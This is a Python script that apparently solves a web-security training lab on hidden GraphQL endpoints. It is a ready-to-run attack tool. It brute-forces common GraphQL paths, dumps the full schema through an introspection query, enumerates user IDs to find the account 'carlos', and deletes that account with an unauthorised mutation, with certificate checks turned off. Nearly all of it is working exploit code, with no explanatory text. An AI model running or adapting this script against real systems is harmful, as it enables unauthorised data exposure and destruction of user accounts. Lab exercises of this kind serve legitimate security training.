# Finding a hidden GraphQL endpoint

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

GRAPHQL_ENDPOINTS = [
"/graphql",
"/api",
"/api/graphql",
"/graphql/api",
"/graphql/graphql",
"/graphql/v1",
"/api/v1",
"/api/graphql/v1",
"/graphql/api/v1",
"/graphql/graphql/v1",
"/graphql/v2",
"/api/v2",
"/api/graphql/v2",
"/graphql/api/v2",
"/graphql/graphql/v2"
]

##########################################################
#	FUNCTIONS
##########################################################

def find_endpoints(s, url):
	print('\n[+] Trying to retrieve the hidden endpoints...')
	valid_endpoints = []
	for ep in GRAPHQL_ENDPOINTS:
		api_path = url + ep
		print(api_path)
		r = s.get(api_path)
		if r.status_code != 404:
			print(r.text)
			valid_endpoints.append(ep)
	return valid_endpoints

def get_full_schema(s, url, endpoints):
	print('\n[+] Trying to retrieve the full schema of the database...')
	time.sleep(3)
	payload = "{__schema%0A{queryType{name}mutationType{name}subscriptionType{name}types{%20...FullType}directives{name+description+args{...InputValue}}}}fragment%20FullType%20on%20__Type{kind+name+description+fields(includeDeprecated:true){name+description+args{...InputValue}type{...TypeRef}isDeprecated+deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name+description+isDeprecated+deprecationReason}possibleTypes{...TypeRef}}fragment%20InputValue%20on%20__InputValue{name+description+type{...TypeRef}defaultValue}fragment%20TypeRef%20on%20__Type{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name}}}}"
	if len(endpoints) == 1:
		ep = endpoints[0]
		query = ep + '?query=' + payload
		print('[+] Sending the following requests:\nGET %s' % query)
		full_schema_path = url + query
		r = s.get(full_schema_path)
		time.sleep(1)
		print(r.text)
		return ep
	else:
		for i in range(len(endpoints)):
			ep = endpoints[i]
			query = ep + '?query=' + payload
			print('[+] Sending the following requests:\nGET %s' % query)
			full_schema_path = url + query
			r = s.get(full_schema_path)
			time.sleep(1)
			print(r.text)
			if r.status_code == 200:
				return ep
				break

def get_carlos_id(s, url, endpoint):
	print('\n[+] Trying to retrieve Carlos User Id the database...')
	time.sleep(3)
	for i in range(1,7):
		payload = f'query{{getUser(id:{str(i)}){{id+username}}}}'
		query = endpoint + '?query=' + payload
		print('[+] Sending the following requests:\nGET %s' % query)
		user_path = url + query
		r = s.get(user_path)
		time.sleep(1)
		print(r.text)
		if 'carlos' in r.text:
			return str(i)

def delete_carlos(s, url, carlos_id, endpoint):
	print('\n[+] Trying to delete Carlos User from the database...')
	time.sleep(1)
	payload = f'mutation{{deleteOrganizationUser(input:{{id:{carlos_id}}}){{user{{id}}}}}}'
	query = endpoint + '?query=' + payload
	print('[+] Sending the following requests:\nGET %s' % query)
	user_path = url + query
	r = s.get(user_path)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	if r.status_code == 200 and not "errors" in r.text:
		print('[+] Successfully removed Carlos user !')
	else:
		print('[-] Exploit failed to remove Carlos user <!>')
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Finding a hidden GraphQL endpoint')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			endpoints = find_endpoints(s, url)
			print('[+] Found potential Endpoint:\t%s' % endpoints)
			endpoint = get_full_schema(s, url, endpoints)
			carlos_id = get_carlos_id(s, url, endpoint)
			delete_carlos(s, url, carlos_id, endpoint)
		s.cookies.clear()
		time.sleep(2)
		r = s.get(url)
		if 'Congratulations, you solved the lab!' in r.text:
			print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
